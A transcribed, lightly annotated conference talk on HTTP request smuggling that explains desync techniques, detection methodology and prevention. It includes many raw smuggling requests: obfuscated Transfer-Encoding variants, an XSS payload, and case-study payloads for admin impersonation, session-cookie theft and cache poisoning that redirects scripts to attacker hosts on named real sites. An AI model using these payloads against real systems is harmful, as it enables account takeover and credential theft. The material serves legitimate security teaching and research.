### Introduction
good afternoon and welcome to httpd decync attacks smashing into the cell next doo. 
have you ever seen a system that was so complex that it just had to be vulnerable? These days we rely on layer upon layer of abstraction to have the faintest understanding of what's really going on with the website, and we tell people things like HTTP is stateless and you send one request you get one response, but what if both of those were just kind of wrong. In this session I'll share with you new tools and techniques to Desynchronize complex systems, smash through the barriers around HTTP requests and make websites rain exploits on their visitors.
During some research last year, I came up with a theory, which was if you're trying to select a topic to research, then the best topic is the one that makes you the most nervous. So I asked myself ¿what topic am I personally really scared of? and the answer was HTTP requests smuggling. I saw a presentation on this at DEFCON a few years ago called "Hiding wiki's in HTTP". And it was a thrilling presentation but it also left me far too nervous to want to tackle this topic myself. 
~~~
Q) What topic am i really scared of?
A) HTTP Request Smuggling
	Hiding wookiees in HTTP
	First documented by Watchfire in 2005
~~~
One reason  is that this technique was documented way back in 2005, and yet I'd never seen it successfully applied to a real website. Another is that my technical understanding just wasn't there so some of the diagrams made absolutely zero sense to me, no matter how much I stared at them, and also some of the statements o n the slides were quite concerning. They said things like "you will not earn bounties using this technique" and even worse "you will certainly not be considered like a white hat if you try and test any live website to see if it's vulnerable to this technique". So, at the time I just stayed away from this topic but this year I thought I'd tackle it and see what happened. And quite a few things happened, I might I did managed to earn some bounties and no one's called me a blackout for it so far, although yesterday on Twitter guy did call me a terrorist. 
But I did get quite a few interesting reactions from the people that I reported these vulnerabilities to quite a few people were surprised, one guy was so surprised he appeared to think I was faking the entire thing, thought I was doing some kind of digital sleight of hand in order to trick him into paying me a bounty. Another guy, at the opposite end of the spectrum, liked the unique technique that I used on his website so much, he thought he would take this technique and use it himself on some other bug bounty targets to make himself some money behind my back. And at the time obviously I had no idea he was doing this, he didn't tell me, but then her an into some technical issues with the technique and decided that the best way to solve them was to pretend that he'd independently found this technique, and then email me and ask for help, which didn't work out very well for him. But out of all of this chaos I've been able to bring you safe detection methods to let you find this with zero risk of being called a blackhat, all new methods tot rigger desynchronisation, and exploit the results and fresh methodology in trawling to bring clarity to a topic that's been ignored for far too long. 
### What's the http smuggling
So first I'm going to talk about what makes this attack possible how to assess if a target is vulnerable, and what to do next. Then I'll take a look at how to exploit it using case studies, all based on real websites, starting out with some really easy stuff and then building in complexity and ending with a video of exploitation of a local system in which I'll also show how to use the opensource burp suite extension that I'm releasing, as part of this research. After that I'll talk about how to prevent these attacks and then wrap up and take questions if there's any time left.
![[Pasted image 20240811123452.png]]
If you picture a web site, as an end user, it probably looks something like this, because as an end user that's all that we can directly see. But behind the scenes, most modern websites are routing requests through a chain of web servers speaking to each other using HTTP over a stream based transport layer protocol like TCP or TLS. 
![[Pasted image 20240811123936.png]]
And for the sake of performance these streams are heavily reused following the `HTTP 1.1 keepalive` protocol, which means that HTTP requests are placed back to back on these streams with no delimiters in-between them, and each serve in the chain is required to parse the HTTP headers of each request to work out where that request stops, and the next one starts. So with this set up we've got requests from users all around the world being   funneled over a small pool of TCP or TLS streams to the back-end server,  that then has to parse these requests to kind of split them back up into individual requests.

### CL.TE Attack
having said all of that, it's pretty obvious what's going to go wrong here, right ? What happens if an attacker sends an ambiguous message, one that gets parsed differently by the front-end and the back-end system. 
![[Pasted image 20240811124715.png]]So here the front-end thinks this is one of a request, so it's forwarding the whole thing onto the back-end. But the back end, for some reason, it thinks this message ends with the final blue square (referencia a la representación de las request normales de la imagen), so it thinks that the orange square (referencia a la representación de las request venenosas de la imagen) is the start of the next request. And it's just going to wait for this phantom request to be completed until the front end routes another request onto the back end over the same socket. and then we end up with these two requests being merged together. So, that's it, like the essence of requests smugglings is that you can you can set up a prefix on the back end that will be applied to the next request that hits the back-end, whether that request is sent by us or by somebody else. because we can't directly see what's happening behind the frontend we have to infer everything and it's really easy to get kind of tangled and bogged down in the technical details. I certainly did myself when doing this research, but ultimately it's really that simple.
~~~
POST / HTTP/1.1
Host: example.com
Content-Length: 6           Front-end sees this
Content-Length: 5           Back-end sees this

12345G
~~~
now, let's zoom in and see what the data looks like on the wipe. this message is ambiguous because we're using an absolutely classic desynchronisation technique. we've just specified the content length header twice and the front end is looking at the first content length header, so it's forwarding everything onto the back end including the  G, and the back end is looking at the same second content length header, so it's reading in the blue data (los primeros 5 bytes) and it thinks the G is the start of the next request, so when the next real request actually arrives, there's this G at the start of it, and whoever that user is they're going to get a response saying something like:unknown method G post. 
and that's it we've successfully done a request smuggling attack, the only catch is, this technique is so classic it doesn't really work on anything that's actually worth hacking these days. what does work on plenty of interesting systems is using chunked encoding. 
```
POST / HTTP/1.1
Host: example.com
Content-Length: 6              Front-end sees this
Transfer-Encoding: chunked     Back-end sees this

0

GPOST / HTTP/1.1
```
chunk encoding is an alternative way of specifying the length of the message, whereby instead of specifying the length upfront using the content length header you send this transfer encoding chunked header and that triggers the server to pass the body of the message until it reaches a zero followed by a blank line. so in this example once again the frontend server has looked at the content-length and forwarded everything up to, and including the orange G, and the backend system has seen the chunked header, and they've stopped passing the first request after the zero, and once again they think the G is the start of the next request and we get a G post response. this is basically exactly the same as what I showed you in the previous slide, except that this technique actually works on plenty of real systems. 

### TE.CL Attack
~~~
POST / HTTP/1.1
Host: example.com
Content-Length: 3              Front-end sees this
Transfer-Encoding: chunked     Back-end sees this

6
PREFIX
0

POST / HTTP/1.1
Host: example.com
~~~
Now, what if the Desynchronization happens the other way round, what if it's the front end server that looks at the transfer encoding header and the back end that looks at the content-length? well we can still exploit that, we just need to reformat the attack slightly and we've got this minor limitation in the our malicious prefix that gets applied to the next request, shown in orange(la parte que dice PREFIX Y 0), has to more or less end with a zero followed by a new line. but in general that's not going to cause any problems.

### Forcing desync
now, if you're looking at the content length on this slide you might be wondering why that's three, that's because every line actually ends with `\r\n`, in more or less, so that's just not shown on slides to keep them nice and clean. so, why does that chunk technique work on so many systems? Well, I think we've got to give some credit to the original specification RFC2616, because that says if as a server you receive a message that has transfer-encoding chunked and the content-length, you should prioritize the chunked-encoding. and that kind of implicitly says that these messages are acceptable, that you shouldn't be outright rejecting them 
```
Transfer-Encoding: chunked
Content-Length: 123
```
and thereby all you need to exploit a website is for one of the servers in the chain to not support chunked-encoding and they'll fall back to using the content length and you can Dsynchronize them, and this technique when I found it works on pretty much every single website using the content delivery network (cdn) Akamai. they emailed me this morning to say that they've patched this, but I expect it still works on a decent number of systems out there.

so that's enough by itself to exploit  quite a few systems, but what do you do  if you want to exploit a server where  every server in the chain does support  chunked encoding?
well that's often was  still possible. all you need is a way to  hide the transfer encoding chunked  header from one server in the chain. 
```
Transfer-Encoding : chunked
```
One  way of doing that, is by using some  white space so some servers normalize  white space after the header name. So, some servers will think this says  transfer encoding chunked, whereas others, won't see that, they'll think the space  is actually part of the header name  won't see the header and they'll fall  back to using the content length and you  can D synchronize them. 
```
Transfer-Encoding: xchunked
```
Other servers,  like to grip the transfer encoding  header for the word chunk, so they will  think that this request is  chunked, whereas others tokenized the  headers so they won't think this is  chunked and you can D synchronize them.
```
GET / HTTP/1.1
Transfer-Encoding: chunked



Transfer-Encoding
 : chunked



Transfer-Encoding:[tab]chunked


X: X[\n]Transfer-Encoding: chunked


Transfer-Encoding: chunked
Transfer-Encoding: x
```
and there's loads of techniques that you  can use to D synchronize systems like,  this all right this is just a tiny  sampling of them but every technique on  this slide is one that I've successfully  myself to exploit a real system  during this research. The ones that are  highlighted in orange are techniques  that I came up with myself that I don't  think are documented anywhere else.
so at  this point we understand the  fundamentals of how to desyncronize  service, so we've got a really powerful  building block, but if we just try and  whack a server with this building block,  we're just gonna run into hazards and  complications and a waste time. To avoid  that I've developed this methodology to  guide us in a step-by-step manner  towards a successful export

### Smuggler methodology

first off we  need to detect when the synchronization  is possible. now the obvious way of doing  this is to send a pair of requests, where  the first one is an ambiguous so it's  designed to poison the back end with a  prefix and then the second request is  designed to kind of trigger this  poisoned response. but that technique is  massively unreliable, because if anyone  else's request hits the back end in  between our two requests, they'll get the  poisoned response,  they'll potentially have a bad day, and  we won't find the vulnerability. so we  need a better way of doing it.  after  a lot of effort I think I've got one here: how the server gets handled, how  this request gets handled, depends on how  the server's process these headers. 

if  both systems look at the content length, we get the response pretty much  immediately and everything's fine: 
~~~
POST /ABOUT HTTP/1.1
Host: example.com
Transfer-Encoding: chunked           
Content-Length: 6           

3
abc
Q

CL.CL: backend response
~~~

if the  front end server thinks this message is chunked, then it will read in the first  chunk size of three, read in the ABC and  then it will read in the next chunk size  which is Q, which is not a valid chunk  size because that's meant to be  hexadecimal and thereby it will just  reject this requests out right  and it will never even hit the back end  system.
~~~
POST /ABOUT HTTP/1.1
Host: example.com
Transfer-Encoding: chunked           
Content-Length: 6           

3
abc
Q

TE.TE: frontend response
TE.CL: frontend response

~~~
 but if the front end looks at the  content length header and fords all the blue data (todo excepto la "Q") but not the orange "Q" onto the  back, and and the back end thinks this  message is chunked then the back end  will basically just time out while  waiting for the next chunk size to arrive.
 ~~~
POST /ABOUT HTTP/1.1
Host: example.com
Transfer-Encoding: chunked           
Content-Length: 6           

3
abc
Q

CL.TE: timeout

~~~
  so if we send that request, now we  get a timeout that's strong indication that that server is  vulnerable to request smuggling using  that technique, and we can detect when  the desynchronisation happens the other  way round using a fairly similar  payload.

~~~
POST /ABOUT HTTP/1.1
Host: example.com
Transfer-Encoding: chunked           
Content-Length: 6           

0

X

CL.CL: backend response
TE.TE: backend response
TE.CL: timeout
CL.TE: socket poison
~~~

 the only significant difference  here, is that if the server is vulnerable  the first way round then we end up  accidentally poisoning the backend  socket with the X , which is not an ideal outcome. so you  should make sure you always try the  technique on the Left first. now this  technique should be tried on every  single end point on the target website,  because they may route requests to  different end points to different  back-end servers, and you should try this  with every  desyncronization  technique that you know.  this  strategy is now used by burp suite  scanner and also by the free open-source  tool that I'm releasing as part of this  research to find this vulnerability.  
now  because this technique is based on  influence it will get some false  positives, but it doesn't get very many  and its's real strength is you'll get  vastly less false negatives and there's  no risk to real users. for example on one  target that I found this technique  detected the vulnerability every single  time. Whereas, using the classic approach of  sending a pair of requests, I had to make  800 attempts before one was successful, and that's potentially 800 real users  that got a broken response.

### Confriming desync
now in an  ideal world, you could stop there. but  most people probably want you to prove  that the vulnerability really definitely  exists, so to do that we're going to use  this technique where you send a pair of  requests, and it's kind of unreliable, but  we don't have much choice
~~~
POST /search HTTP/1.1
Content-Length: 51
Transfer-Encoding: zchunked           

11
=x&q=smuggling&x=
0

GET /404 HTTP/1.1
X: X
~~~

~~~
POST /search HTTP/1.1
Content-Length: 1
Transfer-Encoding: zchunked           

96
GET /404 HTTP/1.1
X: X&q=smuggling&x=
Host: example.com
Content-length: 100

x=
0
~~~
so here the  first request is going to smuggle with  this prefix shown in orange (la parte del GET y todo lo que le sigue, la segunda request). and then  we're going to send a second separate  request: 
~~~
POST /search HTTP/1.1
Host: example.com
~~~
and based on the  response (404 si es vulnerable) that we get to that request, we  can tell whether the server is  vulnerable. now it's crucial that these  two requests are not sent over the same  connection to the front end server,  because if you do that you will just get  false positives and also the endpoint , that you send  theses requests to is really important,  because often if if the back end doesn't  like the request that it receives it  will reject it with like a 400 or 500  message and it will close the connection  to the front end server, which will mean  that the the orange poisonous that will  be thrown out, and the attack will fail.  so you want to try and select an  endpoint that expects to receive a post  request, and also try and preserve any  parameters that it needs. for example in  these examples here I've preserved the Q  equals smuggling parameter. the other  thing is, please remember that even if  you do all of that these techniques, this  technique is non-deterministic if anyone  else's request lands in between your two  requests it will fail and also even if  the target has no other uses browsing it,  many websites use a pool of connections  to the back end and so it may still  require multiple attempts. but as soon as  one works you know it's vulnerable 

right  now we're done with the theory we can  finally take a look at what damage we  can do using this technique. every case  study here's a real system i exploited  during this research, i have  unfortunately been forced to redact  rather a large number of company names . but i'd like to give a shout out to  every company that actually let me name  them, please remember these are the guys  that are now actually secure. also during  this section i'm going to keep a running  total of the bounties earned via this  researcher as usual of this of these  bounties we've spent fifty percent on  beer and donated the other fifty percent  to local charities  [Applause].

### Bypassing rules
now, probably the easiest attack you can  do, with request smuggling is bypassing  security rules that have been  implemented on the front end system. on  one well-known software vendor, I found  that their front end was blocking access  to slash admin 

```HTTP
POST / HTTP/1.1
Host: software-vendor.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: software-vendor.com
X:X
```

so by using request  smuggling their front end would first  think I was accessing the view of the  website and then when I sent to the  follow-up request:
```HTTP
POST / HTTP/1.1
Host: software-vendor.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: software-vendor.com
X: XGET / HTTP/1.1
Host: software-vendor.com
```
it would once  again think I was accessing the vote of  the website, but the back-end would think  I was trying to hit that admin page, and  serve it up, so far so simple.

now lots of  front ends like to rewrite requests by  adding headers to them. one header  practically every system uses some  variation of, is X Forwearded For, which just  specifies the remote users IP. now if you  specify this header yourself directly, in  a normal request, any well configured  front-end will rewrite that header or  remove it entirely and so it won't work. but when you smuggle a request you  effectively bypass all the rewrite rules  used on the front end and thereby you  can spoof your IP, and make it look like  your request is coming from anywhere. using this technique I exploited a  particular security vendor and got an  incredible three hundred dollar bounty  ,whoo. so I'm not suggesting you're gonna  get rich quick using this particular  technique but it's worth knowing because  it does work on practically every target  and also there's a slightly less obvious  use for this technique
imagine you've  found a website where the time out based  detection technique works so you're  fairly sure its vulnerable but their  traffic volume is so high that you've  effectively got zero chance of ever  getting a poisoned response yourself,  what you've effectively got there is a  blind request smuggling vulnerability,  how can you prove that that system is  really vulnerable ? well one thing you can  try is send a request that looks  something like that but stick a unique  host name in the x-forwarded-for header.  if you get a DNS lookup for that host  name, that proves the orange data has  been interpreted as a second request by  the backend system and thereby proves  that it is vulnerable to  request smuggling.
~~~
POST / HTTP/1.1
Host: software-vendor.com
Content-Length: 200
Transfer-Encoding : chunked

0

GET / HTTP/1.1
Host: software-vendor.com
X-Forwarded-For: xyz.burpcollaborator.net
X: XGET / HTTP/1.1
Host: software-vendor.com
~~~

### Request reflection
IP spoofing is okay but  the really interesting behavior is going  to come from custom application specific  headers. but to exploit those we need to  know what they are,now on New Relic, I  was able to submit a login  request and I just shuffled the  parameters, so that the email address  parameter was last, 
```HTTP
POST / HTTP/1.1
Host: login.newrelic.com
Content-Length: 142
Transfer-Encoding: chunked
Transfer-Encoding: x


0

POST /login HTTP/1.1
Host: login.newrelic.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
...
login[pass]=1234&login[email]=asdfPOST /login HTTP/1.1
			                      Host: login.newrelic.com
```
then when I sent  my follow-up request, it effectively got  concatenated into the email address that  I was trying to login with.  
~~~RESPONSE
please ensure that your email and password are correct.
<input id="email" value="asdfPOST 
/login HTTP/1.1 
Host: login.newrelic.com
X-Forwarded-For: 81.139.39.150
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECHDE-RSA-AES128
x-nr-external-service: external

~~~
the  response that I got from the server, contained the entirety of my second  request including all of the headers  that the front-end had stuck on to that request. some of those are going to  come in really useful on the next slide. so on New Relic it became evident that  the backend system wasn't the actual  most back-end back-end, it was a reverse  proxy. so by changing the host header, I could access different internal  systems, I basically had SSOF using the  quest smuggler.
~~~
GET / HTTP/1.1                        -> HTTP/1.1 301 Movev Permanently   
Host: staging-alerts.newrelic.com        Location: https://staging-alerts.newrelic.om/  
~~~
however pretty much all of these systems, responded with this redirect  to  HTTPS because they thought my request  was being sent over HTTP,  but by looking  at the previous slide  getting the X Forwarded proto header and  sticking that on there I could tell them  yeah I'm using HTTPS you can trust me  and actually gain access to those  systems 
~~~
GET / HTTP/1.1                        -> HTTP/1.1 404 Not fount x  
Host: staging-alerts.newrelic.com        Action Controller: Exception caught
X-Forwarded-Proto: https
~~~
I went exploring and I found  a page that gave me a incredibly  taunting error message. it said not  authorized with header, then I had a  colon, but it didn't tell me what the  name of the header that I wasn't  authorized with actually was.
~~~
GET / HTTP/1.1                        -> HTTP/1.1 200 ok    
Host: staging-alerts.newrelic.com        Not authorized with header
X-Forwarded-Proto: https
~~~
I  went exploring look through the headers  I'd already discovered the names of and  I tried the XXNR external service  header and that actually just made the  problem worse. 
~~~
GET / HTTP/1.1                        -> HTTP/1.1 403 forbidden    
Host: staging-alerts.newrelic.com        
X-Forwarded-Proto: https
X-nr-external-service: 1
~~~
at this point I could  have tried that request reflection  technique on loads of different  endpoints on different New Relic systems  until I discovered this header. but I was  feeling kind of lazy at this point so I  decided instead I was gonna cheat and  consult my notes from last time I  compromised new relic.
that revealed the service gateway  account ID and service gateway is New  Relic admin headers. so using those I was  able to gain full access to their core  internal API and impersonate any user on  the entire system as an admin and gain  pretty much full control over everything  and I got a reasonable bounty for that 
```HTTP
POST /login HTTP/1.1
Host: staging-alerts.newrelic.com 
Content-Length: 564
Transfer-Encoding: chunked
Transfer-Encoding: cow

0

POST /internal-api/934454/session HTTP/1.1
Host: staging-alerts.newrelic.com 
X-Forwarded-Proto: https
X-nr-external-service: 1
Service-Gateway-Is-Newrelic-Admin: true
Content-Length: 6
...
x=123GET...
```

```response
HTTP/1.1 200 ok  

{
"user": {
	"acount_id": 934454
	"is_newrelic_admin": true
},
	"current_accouint_id": 934454
	...
}
```
and they patched that pretty quickly  with a hotfix,  but they said that the root cause was  their F5 load balancer and I don't  think that's been patched yet, so that's  a zero-day more or less. now what we've  seen here is with request smuggling, If  you're willing to put the time in you  can often break directly into internal  systems and have a good time. but there's  also much easier and more reliable  techniques focused on attacking other  users, so that's what we're going to take  a look at next 

### Involuntary request storage
Firstly if the application has any way of persistently  storing text data, then exploitation is  really easy. on Trello which is a  popular note taking application I  smuggled a request to update my profile.
```HTTP
POST /1/cards HTTP/1.1
Host: trello.com
Transfer-Encoding:[tab]chunked
Content-Length: 4

9f
PUT /1/members/1234 HTTP/1.1
Host: trello.com
Content-Type: application/x-www-form-urlencoded
Content-Length:400

x=x&csrf=1234&username=testzzz&bio=cake
0

GET / HTTP/1.1
Host: trello.com
```
and I made sure that the bar parameter was  last and then I didn't send a follow-up  myself. So, some random other Trello  users request got concatenated onto the  end and then I could just browse my bio  and retrieve their entire request,  including all their session cookies, even  though they're both secure and HTTP only. using this technique with zero user  interaction you can just every time you  send this you get control over a random  person who is currently browsing the  website on a different target, they  didn't have any obvious way of  persistently storing data but I was able  to file a support ticket and get the  users request concatenated into that  ticket, So, that eventually I would I get  an email containing their request and  could once again hijack their account.

now what if you can't store data, well  there's a whole another branch of attack  based on causing harmful responses to  get served directly to people browsing  the site. the simplest one  conceptually is one I found on a  well-known sass vendor, that hasn't  patched it that's why I can't name them.  they had some reflected XSS right and by  itself that's you know that's okay but  it's not that great because it requires  use of interaction to exploit people so  it's not ideal for mass exploitation. but  by smuggling the requests which that  trigger the XSS,
```HTTP
POST /1/cards HTTP/1.1
Host: saas-app.com
Content-Length: 4
Transfer-Encoding : chunked

10
=x&csrf=token&x=
66
POST /index.php HTTP/1.1
Host: saas-app.com
COntent-Length: 100

SAML=a><script>alert(1)</script>
0 POST / HTTP/1.1
Host: saas-app.com
Cokie: ...
```
I could get the harmful  response served to random other people  browsing the website. so we've taken this  issue and we can just exploit random  people with no user interaction, we  can also grab HTTP only  cookies once again using this technique , and this can also be used with  traditionally unexploited or XSS like  XSS in the user agent header or XSS  where there's a C soft token on the  request 

### Web deception

now while testing one target, I  happen to load their homepage in a web  browser where the developer tools open,
~~~
GET https://52.16.21.24 net::ERR_CERT_COMMON_NAME_INVALID
~~~
and this error message popped up and  normally, you know, so what. but I kind of  recognized that IP address, in this error  message which made me a little bit  worried. and what was more worrying is  that I got that error message regardless  of what device I loaded their homepage  on and one network I connected from.
it turned out, yep this was my fault , I  had sent a request trying to trigger of  redirect from their system and someone  else's request, an attempt to fetch an image, had been concatenated  onto it.

```HTTP
POST /1/cards HTTP/1.1
Host: redacted.com
Content-Length: 45
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Host: 52.16.21.24
X: X GET /images/x.png HTTP/1.1
```

they got this redirect  response, which is you know okay that's  not ideal but it's only one user right , who cares about them? but a cache had  seen this happen.
~~~Frontend Responses
GET /images/x.png HTTP/1.1
~~~
so it's seen them try  to fetch this image from the home page  and it'd seen this redirect to my server  come back and then it had saved this, so  for the following the 48 hours everyone  that went to the targets home page ended  up trying to fetch this image from my  website.
### Web Cache Deception
now on the one hand this is a  brilliant demonstration of how easy it  is to do cache poisoning with requests smuggling right, it's so easy I did it by  accident, but on the other hand this is  not something that you really want to  happen unintentionally. so there's some  things you can do to try and reduce  the chance of this. one is to  try and specify a prefix that triggers a  response that will have anti caching  headers, another is to send your victim  follow-up requests as fast as possible , and another is if you've got a choice of  front-ends then just try and target one  in a geographic region that's like  asleep at the time, then you'll be  erasing against less genuine users  traffic.
```HTTP
POST / HTTP/1.1
Transfer-Encoding: blah

0

POST /user/apikey HTTP/1.1
X: X GET /static/site.js HTTP/1.1
Cokie: session=xyz
```
now that wasn't ideal, but  naturally that left me wondering what  happens if we embrace this possibility,  so here I've smuggled a request saying  "I'd like to fetch my API key, please".  and  if someone else's requests it gets  concatenated onto that it's completed  with their cookie , in their session and  it fetches their API key. and then  fetching their own API key is harmless  but if a cache sees that happening and  saves it, then we can just browse to  whatever static resource that user was  trying to fetch and retrieve their key.  if this attack sounds kind of familiar,  yep, that's because this is basically  just a variation of web cache deception, the key difference is that this  technique once again doesn't require any  interaction on the part of the user,  you're just exploiting a random person  browsing the website every time you do. it there's also a minor catch with this  technique, which is that as an attacker  you've got no control over where the  users API key lands on the website, it's  just gonna appear on a random static  resource on that site, so you're going to  have to like reload all the static  resources to try and find that key. now  because my pipeline, that I used to get  examples for these presentations doesn't  bother logging in to websites I don't  have a real example of a vulnerable  target. but I'm pretty sure this  vulnerability does exist out there and  in general you're going to find it in  places that have those properties .

### CDN Chaining
now on  newrelic, the backend was an internal  proxy, and on some other systems the  back-end was actually a CDN, which  doesn't make much sense to me, I found  one server that chained Akamai on to  CloudFlare... ¿why? but on a different system they  chained Akamai on to Akamain but the two  Akamai's were configured differently so  I could desynchronize them:
~~~HTTP
POST /cow.jpg HTTP/1.1
Host: redacted.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: www.redhat.com
X: X GET...
~~~
thereby changing the host header I could  serve up content from any website on the  Akamai platform on these guys website,  and the front end Akamai would then  cache that so I could override their  home page with any content from any site  on the Akamai platform. this technique  also works pretty well on SAS providers, where you can simply just change the host name to a different  client of the SAS provider.
### Chaining DOM Problems
now red-hats  website was itself directly vulnerable  to desynchronization and while looking  for a vulnerability to chain with  requests smuggling on there, I found this dom-based open redirect, and  that raised an interesting challenge
```HTTP
GET /assets/idx?redir=//redhat.com@evilt.net/ HTTP/1.1
Host: www.redhat.com
```
~~~Js
<script>
var destination = getQueryParams('redir)
[low quality filtering]
document.location = destination
</script>
~~~
because with requests smuggling, we  controlled the URL that the backend  server thinks the user is on, but we  don't control the URL in the victim's  browser. so, when this get query param  function is executed that's executed in  the victim's browser, so we can't  directly exploit this vulnerability, but  by finding a local redirect on the  target I could effectively chain that  with the Dom based  redirect and gain  control of the URL in their users  browser and exploit this issue. 
```HTTP
GET /en/search?dest=../idx?redir=... HTTP/1.1
Host: www.redhat.com
```
~~~Response
HTTP/1.1 301 Found
Location: /assets//idx?redir=//redhat.com
~~~
and  that's a generic technique that will  work, that will let you combine any Dom  based issue that looks at the URL with  request smuggling to exploit people  without user interaction.
### Redirects with teeth

now a quite a  few local redirects actually turn into  open redirects in the presence of  requests smuggling, because we can change  the smuggled host header.
in particular  there's a default behavior on Apache and  most versions of iis, whereby if you try  and access a folder and you don't  specify the training slash they give you  a redirect to put the slash on and they  populate the host name in that redirect  using the host header. 
```HTTP
POST / HTTP/1.1
Host: redacted.com
Content-length: 57
Transfer-Encoding: chunked

0

POST /etc HTTP/1.1
Host: burpcollaborator.net
X: X GET /etc/libs/xyz.js HTTP/1.1
```
~~~response
 HTTP/1.1 301 Movev Permanently  
 Location: https://burpcollaborator.net/etc/ 
~~~

because this  technique works on loads of systems,  you can use that to redirect JavaScript  loads on the target website and thereby  gain full control over whatever  page the JavaScript load comes from. and  use it for cache poisoning in just came  like full control over the website more  or less permanently. This became my  default technique to exploit this  vulnerability, and I got quite a few  different bounties using it.

a couple of  extra points worth mentioning if you get  a 307 open redirect that is absolute  gold dust, because imagine a web browser  is doing a post request to log someone  in ¿right? if it receives a 307 redirect, it will repost those credentials to the  new website. so you can just make people  send you their username and password in  plain text with no user interaction. also  worth mentioning is that some thick clients, like a non browser-based  HTTP libraries have that data reposting  behavior on all the redirects rather  than just 307 ones, so for example on New  Relic I was able to to steal the API  tokens off one of their clients, even  though they were only using a 301 redirect.
### PayPal Poisoning
now one of the targets that  this redirect cache poisoning JavaScript  hijacking strategy worked on who was  PayPal. if you try to access web static, they gave you a redirect using the host  header to populate it. 
~~~HTTP
POST /webstatis/r/fb/fb-all-prod.pp2.min.js HTTP/1.1
Host: c.paypal.com
Content-length: 61
Transfer-Encoding: chunked

0

GET /webstatic HTTP/1.1
Host: skeletonscribe.net?
X: XGET /webstatis/r/fb/fb-all-prod.pp2.min.js HTTP/1.1
Host: c.paypal.com
Connection: close
~~~
~~~response
 HTTP/1.1 302 Found  
 Location: https://skeletonscribe.net?, c.paypal.com/webstatic/ 
~~~
there was a couple  of problems though. one is that the two  hosts headers were getting concatenated,  and we only control the first one, so  this was breaking the redirect, but that  was easily fixed by sticking a question  mark at the end of the host header. the  other issue is the protocol on this redirect its HTTP,  and because of  browsers as a mixed content protections  that meant that this is only going to be  exploitable in Safari and edge and AI  for the details of how you can exploit  those, you'll need to check out my cache  poisoning presentation from last year, because I don't have time to cover it  right now. but important thing is,
paypal.com/sigin ---> c.paypal.com/fb-all.js
this  javascript file that I could  persistently turn into a redirect on my  own malicious javascript file was used  on PayPal's login page.

imposible thanks  csp
paypal.com/sigin -X-> c.paypal.com/fb-all.js ---> evil.net

unfortunately their login page you see  CSP which blocked the redirect, but their login page  also loaded a different page in an  iframe and this sub page didn't use CSP  and also imported my poisoned JavaScript  file, 

paypal.com/sigin -X-> c.paypal.com/fb-all.js ---> evil.net
 |                                   ^
 iframe                         |
└-> c.paypal.com/i --┘

so I could hijack the iframe, but  thanks to the same origin policy, I  couldn't read the user's password off  the parent page because I was stuck on c.paypal.com/i. 

paypal.com/sigin -X-> c.paypal.com/fb-all.js ---> evil.net
 |                  |                ^      |
 iframe      SOP           |      |
 |                  |                 |     |
└-> c.paypal.com/i --┘< ┘ 

But, my colleague Gareth  Heyes, found an endpoint paypal.com/us/gifts and this is a static page, it doesn't have CSP or it in it at the  time and it once again imports my  malicious javascript file, 

paypal.com/sigin -X-> c.paypal.com/fb-all.js ---> evil.net
 |                                   ^     |   ^                    |
 iframe                         |     |   |                     |
└-> c.paypal.com/i --┘ <┘  |                     | 
        └->    paypal.com/us/gifts  <┘
  
so by first  compromising the iframe, because it loads  c.paypal.com/i and then redirecting  the iframe to paypal.com/us/gifts  and then re compromising it using  my javascript file, i could then read the  user's paypal password off the payment page and send it off to  my website.

 PASSWORD
 ⌐-----------------------------------------------------------------------------¬
 |                                                                                       ↓
paypal.com/sigin -X-> c.paypal.com/fb-all.js ---> evil.net
 |                                   ^     |   ^                    |
 iframe                         |     |   |                     |
└-> c.paypal.com/i --┘ <┘  |                     | 
        └->    paypal.com/us/gifts  <┘

so the end impact is if you  went to pay powers website in one of  those browsers i just more less got your  password and they paid a healthy  nineteen thousand dollar bounty for that  [Applause]  

### Wrapped exploits
now PayPal fix this issue by can  reconfiguring the front end,which was  Akamai, to block any requests that had  the word chunked and the transfer  encoding header. they asked  me like: ¿I'll be no acts do you think  this is a solid fix? and I kind of poked  at it for a little bit and I was like, yep, looks solid to me and then a few  weeks later, I decided to try out a new desynchronization technique ,where I simply  used a line wrapped header
~~~HTTP
GET / HTTP/1.1
Host: c.paypal.com
Content-length: 5
Transfer-Encoding: chunked

0

GET / HTTP/1.1
Host: c.paypal.com
Content-length: 5
Transfer-Encoding:
 chunked

0
~~~
~~~RESPONSE
HTTP/1.1 403 Forbidden
server: AkamaiGHost

<html>
<head><title>
Access denied </title>
</head></html>

HTTP/1.1 200 OK
~~~
and this  strategy is pretty much RFC compliant  and I didn't really think it was going  to work on it work on anything and it  didn't directly work on any systems. but  it turns out there was a little bug in  Akamai, whereby if you use line wrapping,  they don't see any of the data  after the line wrap, so that I mean they  didn't see this header, they let it  through I could once again desynchronize  PayPal login page, taking a control of it  and I got another twenty thousand dollar  bounty  [Applause]  
I thought that was really generous of  PayPal, especially given that it was  basically my fault in the first place 

### Preventing
 as far as preventing these attacks goes there best off prevented on the  front end system, because the back end  can't normalize the requests, it just has to reject them  outright. but firstly you can't fix this  unless you can find it properly.
  so make  sure that whatever tool you're using  supports sending invalid content length  headers and doesn't automatically  normalize requests, in particular that  means if you're trying to replicate this  vulnerability using KO, depending on  which the synchronization technique  you're using it may not work. also some  companies like to proxy pen testers, and  if you do that you'll fail to find  genuine vulnerabilities that exist and  you'll also find kind of phantom  vulnerabilities that only let you  exploit other pen testers, so it's not a  very good idea. as far as patching this  goes the idea is just to make the  front-end exclusively use HTTP to to  talk to the back end but if that's not  plausible than the front end needs to  normalize any ambiguous requests before  routing them downstream. that strategy is  backed up by RFC 7230 so that's probably  what you want to do,  if you're stuck on  the back end yeah you just have to  reject the request outright and drop the  connection. it's not ideal which is why  this is better off being patched from a  front-end.
  ![[Pasted image 20240811200959.png]]
- Whitepaper
  https://portswigger.net/blog/http-desync-attacks
- Online labs
   https://portswigger.net/web-security/request-
- Burp Suite Extension
   https://github.com/portswigger/http-request-smuggler
- References
	http://cgisecurity.com/lib/HTTP-Request-Smuggling.pdf

